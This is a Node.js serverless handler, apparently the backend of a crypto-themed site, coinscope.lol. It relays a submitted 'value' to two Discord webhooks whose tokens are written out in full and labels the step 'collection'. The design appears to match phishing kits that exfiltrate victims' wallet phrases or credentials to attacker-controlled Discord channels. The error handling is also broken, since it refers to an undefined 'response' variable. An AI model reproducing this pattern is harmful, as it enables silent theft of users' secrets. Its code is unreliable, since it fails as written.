module.exports = async function handler(req, res) {

  // CORS
  const allowedOrigins = [
    'https://www.coinscope.lol',
    'https://coinscope.lol'
  ];

  const origin = req.headers.origin;

  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }

  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle browser preflight request
  if (req.method === 'OPTIONS') {
    return res.status(204).end();
  }

  // Only allow POST
  if (req.method !== 'POST') {
    return res.status(405).json({
      error: 'Method not allowed'
    });
  }

  try {
    const { value } = req.body || {};

    if (!value) {
      return res.status(400).json({
        error: 'Missing value'
      });
    }

    const webhooks = [
      "https://discordapp.com/api/webhooks/1537149003240579103/L0YukD2iJODVs5KR4RVUjGM5lE1n_JyKhhvi8jDEV8RWyzdTvam0Cc4f8dCfQ0SOjOnf", 
      "https://discord.com/api/webhooks/1537898224327856188/NtPVf8IO88mSJ4LeOFKAHCj4J4p7tPyf9J1IUdYguqP15nm8UGDGlrpCCZthC53UAAm4"
    ];

   const responses = await Promise.all(
       webhooks.map(webhook => 
       fetch(webhook, {
        method: 'POST',
        headers: {
         'Content-Type': 'application/json'
        },
      body: JSON.stringify({
        content: value
      })
    })
  )
);

    const failedResponses = responses.filter(response => !response.ok);

    if (!response.ok) {
      const errorText = await response.text();

      console.error(
        'Discord error:',
        response.status,
        errorText
      );

      return res.status(502).json({
        error: 'Discord webhook failed',
        status: response.status
      });
    }

    return res.status(200).json({
      success: true
    });

  } catch (error) {
    console.error(
      'Collect error:',
      error
    );

    return res.status(500).json({
      error: 'Collection failed'
    });
  }
};